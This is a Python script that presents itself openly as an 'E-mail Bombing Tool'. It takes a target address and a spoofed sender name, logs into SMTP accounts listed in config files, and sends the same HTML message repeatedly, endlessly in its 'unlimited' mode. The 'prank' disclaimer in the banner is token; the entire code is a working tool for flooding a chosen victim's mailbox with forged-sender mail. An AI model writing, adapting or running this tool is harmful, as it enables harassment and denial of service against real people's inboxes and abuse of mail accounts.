import smtplib
import time
import os
import sys
import random
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# Colors
r = "\033[1;31m"
g = "\033[1;32m"
y = "\033[1;33m"
b = "\033[1;34m"
d = "\033[2;37m"
R = "\033[1;41m"
Y = "\033[1;43m"
B = "\033[1;44m"
w = "\033[1;37m"

# Script banner
logo = f"""{w}

{w}[{r}!{w}] {r}This is use for E-mail Bombing, You can Unlimitedly send !!! BYE :_)
{w}
┌-=============================   -   
=      {r}. ┌──────── {w}Vaim-Emsg     -   
=  {r}.┌───  {w}B-Hat VaimYT PROJECT   -   {b}[{g}✔{b}] https://github.com/VaimpierOfficial    [{g}✔{b}]
{w}=    E-mail BOMBING TOOL          -   {b}[{g}✔{b}]            Version 1.0                 [{g}✔{b}]
{w}= {r}. └──── {w}BY Vaimpier Ritik      -   {r}[{R}X{r}] Please Don't Use For illegal Activity  [{R}X{r}]
{w}= {r}.     └─── {w}VERSION 1.0         -
{w}└-=============================   -

{r}    
Disclaimer: {g}this tool is designed for Prank
	    testing in an authorized simulated cyberattack
	    Attacking targets without prior mutual consent
            is illegal!                                                               
{w}                                    
{w} """

def banner():
    print(logo)

# Menu
os.system("clear")
banner()
wow = 0
tar_email = input(r+"└─"+w+"\033[1;37mEnter Target E-mail: "+r)
fuck = input(r+"└─"+w+"\033[1;37mDo you wanna Unlimitedly [ y / n ]: "+b)
if fuck.lower() in ['y', 'yes']:
    wow = 1
if fuck.lower() in ['n', 'no']:
    count = int(input(r+"..└─"+w+"\033[1;37mHow many you wanna send: "+b))
spoof = input(r+"└─"+w+"\033[1;37mEnter Any Name: "+r)

# Open and read files
with open('email.conf', 'r') as f:
    email = f.read().split()
with open('pass.conf', 'r') as f:
    password = f.read().split()
with open('hosts.conf', 'r') as f:
    host = f.read().split()
with open('ports.conf', 'r') as f:
    port = f.read().split()
with open('message.conf', 'r') as f:
    Es = f.read()

# Message binding
msg = MIMEMultipart()
msg["To"] = tar_email
msg["From"] = str(spoof) + "<Any@gmail.com>"
msg.attach(MIMEText(Es, 'html'))

# Sending mail
def vaimpier(email, password, host='smtp.gmail.com', port=587):
    try:
        s = smtplib.SMTP(str(host), int(port))
        s.starttls()
    except Exception as e:
        print(r+"└─"+w+f"[ ✖ ] Failed : {r}Put right Host or Port !!! :_)\n")
        exit()
    try:
        s.login(email, password)
    except Exception as e:
        print(r+"└─"+w+f"[ ✖ ] Login Failed : {r}Put right Mail or Password or check less secure apps enable or not !!! :_)\n")
        exit()
    z = 0
    if wow == 1:
        while True:
            s.send_message(msg)
            print(r+"└─"+w+f"[ ✔ ] Sucess{r}", z+1)
            z += 1
    else:
        for i in range(0, count):
            s.send_message(msg)
            print(r+"└─"+w+f"[ ✔ ] Sucess{r}", i+1)
    s.close()

for c in range(len(email)):
    vaimpier(email[c], password[c], host[c], port[c])

# Thank you message
ritik_welcome = [
    'Thanks for using our tool', 
    'Keep using this tool Thanks Brother !!!', 
    'Bye dear :)', 
    'Hope you enjoy with this tool',
    'We are Vaimpier :) Bye',
    'Thank you so much dear :)',
    'Keep learning keep hacking :)',
    'Bye :) Next Update soon',
    'We have many tools like this subscribe our channel to get more',
    'Have a Good day dear :) ',
    'Vaimpier Ritik says :) Thanks dear Bye :_)'
]

print("\n")
print(r+"└─"+w+"[!] "+r+random.choice(ritik_welcome))
print("\n")
